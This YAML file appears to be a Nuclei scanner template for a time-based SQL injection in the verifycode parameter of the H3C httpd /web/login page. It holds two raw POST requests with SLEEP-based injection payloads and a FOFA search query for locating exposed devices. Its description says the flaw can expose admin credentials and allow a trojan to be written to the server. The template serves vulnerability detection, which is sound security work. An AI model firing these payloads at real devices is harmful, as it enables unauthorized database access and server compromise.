http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /web/login HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded

          user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(4)))dfpe) AND 'dYCM'='&language=0
        - |
          POST /web/login HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded

          user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP(8)))dfpe) AND 'dYCM'='&language=0
id: H3C-http-web_login-sql-time
info:
    author: Superhero
    description: |-
        fofa: server="H3C httpd" && title=="请登录"
        H3C http服务器 /web/login 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: H3C http服务器 /web/login SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/aUM5zlV1it5ND4xhFMGz4g
    severity: high
    tags: []
